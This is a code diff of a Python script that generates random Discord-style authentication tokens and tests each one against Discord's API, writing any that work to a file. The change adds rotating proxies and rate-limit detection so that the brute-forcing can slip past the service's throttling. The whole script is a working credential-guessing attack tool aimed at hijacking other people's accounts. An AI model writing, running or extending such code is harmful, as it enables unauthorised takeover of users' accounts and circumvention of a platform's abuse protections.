@@ -2,10 +2,15 @@ import random
 import string
 import os
 import requests
+import proxygen
+from itertools import cycle
+
 print("NOTE! 1 token loop = 5 Tokens of different types. ")
 N = input("How many tokens loop?: ")
 count = 0
 current_path = os.path.dirname(os.path.realpath(__file__))
+url = "https://discordapp.com/api/v6/users/@me/library"
+
 while(int(count)<int(N)):
     tokens = []
     firstGen = random.choice(string.ascii_letters).upper()+random.choice(string.ascii_letters).upper()+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+ random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
@@ -24,19 +29,22 @@ while(int(count)<int(N)):
     tokens.append(thirdGen)
     tokens.append(fourthGen)
     tokens.append(fifthGen)
-    for token in tokens:
-        header = {
-            "Authorization": token
-        }
-        src = requests.get('https://discordapp.com/api/v6/auth/login', headers=header)
-        try:
-            if src.status_code == 200:
-                print('[+] Token Works!')
-                f= open(current_path+"/"+"workingtokens.txt","a")
-                f.write(token+"\n")
-            else:
-                print('[-] Invalid Token.')
-        except Exception:
-            print("[-] Can't connect to discordapp.com")
-    tokens.remove(token)
+    proxies = proxygen.get_proxies()
+    proxy_pool = cycle(proxies)
     
+    for token in tokens:
+        proxy = next(proxy_pool)
+        header = {
+            "Content-Type": "application/json",
+            "authorization": token
+        }
+        r = requests.get(url, headers=header, proxies={"http": proxy})
+        if r.status_code == 200:
+            print('[+] Token Works!')
+            f = open(current_path+"/"+"workingtokens.txt","a")
+            f.write(token+"\n")
+        elif "rate limited." in r.text:
+            print("[-] You are being rate limited.")
+        else:
+            print('[-] Invalid Token.')
+    tokens.remove(token)
